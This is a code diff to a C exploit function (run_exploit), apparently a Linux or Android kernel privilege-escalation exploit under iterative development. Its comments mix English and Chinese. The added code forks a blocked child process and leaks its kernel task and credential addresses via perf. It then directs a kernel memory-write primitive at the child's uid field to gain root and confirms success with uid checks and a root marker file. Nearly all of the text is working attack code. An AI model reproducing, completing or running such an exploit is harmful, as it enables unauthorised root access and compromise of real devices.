@@ -540,22 +540,77 @@ int run_exploit(int argc, char **argv) {
     if (getenv("PSELECT_CRED")) {
       pr_info("mt28c: CRED overwrite mode\n");
       fflush(stdout);
-      /* mt28m: 先备页 (ks) 再 perf — perf 在 ks 前会破坏 memfd open (Permission denied) */
+      /* mt41: OBS_ONLY - just leak and print cred_cand, no write */
+      if (getenv("PSELECT_OBS_ONLY")) {
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+        if (!page_base) { pr_error("mt41: page prep failed\n"); return 1; }
+        uintptr_t t = perf_find_task();
+        pr_info("mt41: OBS task=%016zx cred_cand=%016zx\n", (size_t)t, (size_t)g_perf_cred_cand);
+        fflush(stdout);
+        sleep(1);
+        return 0;
+      }
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
       pr_info("mt19: SLIDE page prepared base=0x%016zx\n", page_base);
       if (!page_base) {
         pr_error("mt28m: page prep failed\n");
         return 1;
       }
-      uintptr_t task = perf_find_task();
+      /* mt33: ghostlock W2 - fork blocked child, leak its task, write its cred */
+      int cred_pipe[2];
+      if (pipe(cred_pipe) != 0) { pr_error("mt33: pipe failed errno=%d\n", errno); return 1; }
+      pid_t cred_child = fork();
+      if (cred_child < 0) { pr_error("mt33: fork failed errno=%d\n", errno); return 1; }
+      uintptr_t task = 0;
+      if (cred_child == 0) {
+        close(cred_pipe[0]);
+        uintptr_t my_task = perf_find_task();  /* also fills g_perf_cred_cand in child */
+        uintptr_t my_cred = g_perf_cred_cand;
+        ssize_t wr = write(cred_pipe[1], &my_task, sizeof(my_task));
+        ssize_t wr2 = write(cred_pipe[1], &my_cred, sizeof(my_cred));
+        if (wr != (ssize_t)sizeof(my_task) || !my_task) _exit(1);
+        pr_info("mt33: child pid=%d task=%016zx blocking-for-cred-write\n", getpid(), (size_t)my_task);
+        fflush(stdout);
+        uint32_t uaddr = 0;
+        /* mt36: full block like ghostlock child - permanent futex wait */
+        syscall(SYS_futex, &uaddr, FUTEX_WAIT, 1, NULL, NULL, 0);
+        /* parent wakes us after cred write */
+        if (getuid() == 0) {
+          pr_success("mt36: CHILD-ROOT uid=0 pid=%d\n", getpid());
+          fflush(stdout);
+          _exit(42);
+        }
+        _exit(2);
+      }
+      close(cred_pipe[1]);
+      ssize_t rr = read(cred_pipe[0], &task, sizeof(task));
+      ssize_t rr2 = read(cred_pipe[0], &g_perf_cred_cand, sizeof(g_perf_cred_cand));
+      close(cred_pipe[0]);
+      if (rr != (ssize_t)sizeof(task) || !task) {
+        pr_error("mt33: child-task-leak-failed rr=%zd task=%016zx\n", rr, (size_t)task);
+        kill(cred_child, SIGKILL);
+        waitpid(cred_child, NULL, 0);
+        return 1;
+      }
       if (!task) {
         pr_error("mt28c: perf task leak failed\n");
         return 1;
       }
-      uintptr_t cred_ptr = task + TASK_CRED_OFF;
+      /* mt40: route C - use perf-leaked cred addr, write cred content (real uid@+0x4), not ptr */
+      uintptr_t cred_addr = g_perf_cred_cand;
+      if (!cred_addr) {
+        pr_error("mt40: no cred_cand from perf - need PSELECT_PERF_CRED\n");
+        kill(cred_child, SIGKILL);
+        waitpid(cred_child, NULL, 0);
+        return 1;
+      }
+      uintptr_t cred_uid_ptr = cred_addr + 0x4;
       char pc_env[32], right_env[32], left_env[32];
-      snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_ptr - 8));
-      snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_ptr);
+      snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
+      snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
+      pr_info("mt40: task=%016zx cred_addr=%016zx uid_ptr=%016zx\n",
+              (size_t)task, (size_t)cred_addr, (size_t)cred_uid_ptr);
+      fflush(stdout);
       /* mt28n: PSELECT_CRED_BOOTID=1 → 观测测试: tree_left=boot_id (可观测),
        * 其余单词不变 — 验证 Case-2 在 CRED 单词下是否触发 */
       if (getenv("PSELECT_CRED_BOOTID")) {
@@ -563,8 +618,6 @@ int run_exploit(int argc, char **argv) {
                  (size_t)SLIDE_RANDOM_BOOT_ID_DATA);
         pr_info("mt28n: OBSERVABLE mode (tree_left=boot_id)\n");
       }
-      pr_info("mt28m: task=%016zx cred_ptr=%016zx\n",
-              (size_t)task, (size_t)cred_ptr);
       fflush(stdout);
 
       int retries = 8;
@@ -579,12 +632,12 @@ int run_exploit(int argc, char **argv) {
          * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
          * WRIGHT = init_cred dmap (写入值)
          * WLEFT = 0 (Case-1 主树写, 不崩) */
-        setenv("PSELECT_WPC", pc_env, 1);
-        setenv("PSELECT_WRIGHT", right_env, 1);
-        setenv("PSELECT_WLEFT", "0", 1);
-        setenv("PSELECT_TREE_PC", "0", 1);
+        setenv("PSELECT_TREE_PC", pc_env, 1);  /* mt44: use TREE_PC (main tree, mt26 same path) */
         setenv("PSELECT_TREE_RIGHT", "0", 1);
         setenv("PSELECT_TREE_LEFT", "0", 1);
+        setenv("PSELECT_WPC", "0", 1);
+        setenv("PSELECT_WRIGHT", "0", 1);
+        setenv("PSELECT_WLEFT", "0", 1);
         setenv("PSELECT_PI_PC", "0", 1);
         setenv("PSELECT_PI_RIGHT", "0", 1);
         setenv("PSELECT_PI_LEFT", "0", 1);
@@ -598,14 +651,34 @@ int run_exploit(int argc, char **argv) {
                   (unsigned long long)slide_read_boot_id(), getuid());
           fflush(stdout);
         }
-        if (getuid() == 0) {
-          pr_success("mt28i: ★★★ ROOT uid=0 attempt=%d ★★★\n", att);
-          got_root = 1;
-          break;
+        /* mt36: wake child to check cred (child's cred was written) */
+        uint32_t wu = 0;
+        syscall(SYS_futex, &wu, FUTEX_WAKE, 1, NULL, NULL, 0);
+        int cst2 = 0;
+        if (waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
+          if (WIFEXITED(cst2) && WEXITSTATUS(cst2) == 42) {
+            pr_success("mt36: CHILD-ROOT attempt=%d\n", att);
+            got_root = 1;
+            break;
+          }
         }
         slide_reset_trigger_state();
         usleep(300000);
       }
+      /* mt33: wait for child result (42 = root) */
+      int cst = 0;
+      for (int i = 0; i < 60; i++) {
+        if (waitpid(cred_child, &cst, WNOHANG) == cred_child) {
+          if (WIFEXITED(cst) && WEXITSTATUS(cst) == 42) {
+            pr_success("mt33: *** CHILD-ROOT confirmed ***\n");
+            got_root = 1;
+          }
+          break;
+        }
+        usleep(100000);
+      }
+      /* mt33: no root - leave child blocked (killing it may touch bad cred) */
+      if (0) kill(cred_child, SIGKILL);
       if (got_root) {
         int fd = open("/data/local/tmp/root_marker.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (fd >= 0) {
